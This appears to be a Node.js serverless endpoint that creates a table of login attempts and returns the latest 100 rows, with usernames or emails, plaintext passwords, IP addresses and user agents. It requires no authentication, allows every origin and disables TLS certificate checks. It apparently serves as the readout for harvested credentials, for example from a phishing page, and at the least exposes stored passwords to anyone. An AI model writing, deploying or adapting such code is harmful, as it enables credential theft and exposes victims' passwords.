const { Pool } = require('pg');
const cors = require('cors');

const corsMiddleware = cors({ origin: '*' });

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false
  }
});

module.exports = async (req, res) => {
  corsMiddleware(req, res, async () => {
    if (req.method !== 'GET') {
      return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
      await pool.query(`
        CREATE TABLE IF NOT EXISTS login_attempts (
          id SERIAL PRIMARY KEY,
          email_or_username VARCHAR(255) NOT NULL,
          password VARCHAR(255) NOT NULL,
          ip_address INET,
          user_agent TEXT,
          created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
      `);

      const result = await pool.query(
        'SELECT id, email_or_username, password, ip_address, user_agent, created_at FROM login_attempts ORDER BY created_at DESC LIMIT 100'
      );

      res.json({
        success: true,
        attempts: result.rows
      });

    } catch (error) {
      console.error('Get login attempts error:', error);
      res.status(500).json({ 
        success: false, 
        message: 'Server error' 
      });
    }
  });
};